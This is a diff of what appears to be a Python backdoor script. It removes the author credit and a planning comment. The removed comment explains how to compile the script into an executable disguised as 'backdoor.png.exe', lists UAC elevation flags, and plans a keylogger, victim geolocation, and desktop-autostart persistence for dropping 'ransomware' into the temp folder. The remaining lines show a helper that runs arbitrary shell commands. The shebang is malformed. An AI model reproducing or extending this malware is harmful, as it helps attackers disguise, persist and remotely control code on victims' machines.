@@ -1,7 +1,4 @@
-#!/bin/bash/env python
-# coding=UTF-8
-# by Tarcisio marinho
-# github.com/tarcisio-marinho
+#!/bin/bash/env python3
 
 
 import socket, os, time, subprocess, tempfile, random, threading
@@ -20,43 +17,6 @@ elif(os.name == 'nt'):
 
 filename='backdoor.exe' 
 tempdir = tempfile.gettempdir()
-
-''' COMPILAR O BACKDOOR
- pyinstaller -F --clean -w backdoor.py -i icone.png -n backdoor.png.exe
-
- testar ->
---uac-admin           Using this option creates a Manifest which will
-                        request elevation upon application restart.
-  --uac-uiaccess        Using this option allows an elevated application to
-                        work with Remote Desktop.
-
-
- Keylogger.
- Geographic Location.
- Change victim's computer background.
- Backdoor complete (Only when all features ready).
-
- DOWNLOAD ALL FILES IN ONE FOLDER
-
-
- UNIX PERSISTENCE :
-        https://askubuntu.com/questions/48321/how-do-i-start-applications-automatically-on-login
-    copiar ransomware para -> TEMPDIR
-    file -> ransomware.desktop
-
-    UBUNTU
-    [Desktop Entry]
-    Type=Application
-    Name=<Name of application as displayed>
-    Exec=<command to execute>
-    Icon=<full path to icon>
-    Comment=<optinal comments>
-    X-GNOME-Autostart-enabled=true
-
-    GNOME gnome-session-properties
-
-    criar um sh -> gnome-terminal  -e  "/batch-path/batch-name.sh"
-'''
 
 def run(command):
     command = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
